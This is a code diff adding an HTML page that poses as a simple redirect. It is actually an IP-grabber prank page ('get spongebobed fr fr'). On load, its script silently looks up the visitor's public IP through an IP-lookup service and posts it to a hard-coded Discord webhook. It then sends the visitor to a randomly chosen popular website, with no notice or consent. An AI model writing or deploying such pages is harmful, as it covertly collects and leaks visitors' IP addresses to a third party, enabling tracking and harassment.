@@ -1,0 +1,43 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    async function sendIPAndRedirect() {
+      const randomWebsites = [
+        "https://google.com",
+        "https://wikipedia.org",
+        "https://youtube.com",
+        "https://news.ycombinator.com"
+      ];
+      const randomSite = randomWebsites[Math.floor(Math.random() * randomWebsites.length)];try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    const ip = data.ip;
+
+    const webhookUrl = 'https://discord.com/api/webhooks/1372316286230728835/vJEH3Ns5L2SKa3__FIDzKLhQ-4W2fbmhUre_JzpDX59KeGTlOSUxPmagXOuIPAP6Tmpn';
+
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: `Visitor IP: ${ip}`
+      }),
+    });
+  } catch (err) {
+    console.error('error please try again:', err);
+  } finally {
+    window.location.href = randomSite;
+  }
+}
+
+window.onload = sendIPAndRedirect;
+
+  </script>
+</head>
+<body>
+  <p>get spongebobed fr fr</p>
+</body>
+</html>l>
